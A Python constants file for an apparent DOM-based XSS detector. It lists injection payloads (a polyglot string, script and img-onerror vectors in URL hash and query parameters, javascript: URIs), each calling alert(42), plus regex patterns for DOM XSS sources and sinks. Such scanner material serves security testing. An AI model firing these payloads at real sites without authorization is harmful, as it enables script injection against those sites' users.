#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright ©  2021-12-06 16:04 bucktoothsir <rsliu.xd@gmail.com>
#
# Distributed under terms of the MIT license.

"""
Constant Variables used in class DomXSSDetector.
"""

UNLIKELY_INT = 42
UNLIKELY_STR = str(UNLIKELY_INT)
POLYGLOT_ALERT = "#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(" \
    + UNLIKELY_STR \
    + ") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(" \
    + UNLIKELY_STR \
    + ")//>\\x3e"
HASH_SCRIPT_ALERT = "#<script>alert(" + UNLIKELY_STR + ")</script>"
HASH_IMG_ALERT = "#<img src=\"random.gif\" onerror=alert(" + \
    UNLIKELY_STR + ")>"
HASH_HASH_ALERT = "#abc#<script>alert(" + UNLIKELY_STR + ")</script>"
QUERY_IMG_ALERT = "?name=<img src=\"random.gif\" onerror=alert(" \
    + UNLIKELY_STR \
    + ")>"
HASH_HASH_IMG_ALERT = "#abc#<img src='random.gif' onerror=alert(" \
    + UNLIKELY_STR \
    + ")"
HASH_JAVASCRIPT_ALERT = "#javascript:alert(" \
                        + UNLIKELY_STR \
                        + ")"
HASH_ALERT = "#alert(" + UNLIKELY_STR + ")"
QUERY_HASH_IMG_ALERT = "?name=abc#<img src=\"random.gif\" onerror=alert(" + \
    UNLIKELY_STR + ")>"
ATTACK_VECTORS = [
    POLYGLOT_ALERT,
    HASH_JAVASCRIPT_ALERT,
    QUERY_HASH_IMG_ALERT,
    HASH_ALERT,
    QUERY_IMG_ALERT,
    HASH_SCRIPT_ALERT,
    HASH_IMG_ALERT,
    HASH_HASH_ALERT,
    HASH_HASH_IMG_ALERT,
]
RE_DOMXSS_SOURCES = '(location\s*[\[.])|([.\[]\s*["\']?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)'
RE_DOMXSS_SINKS = '((src|href|data|location|code|value|action)\s*["\'\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*["\'\]]*\s*\()'
SEPERATOR = "-------------------------------------------------------------\n"
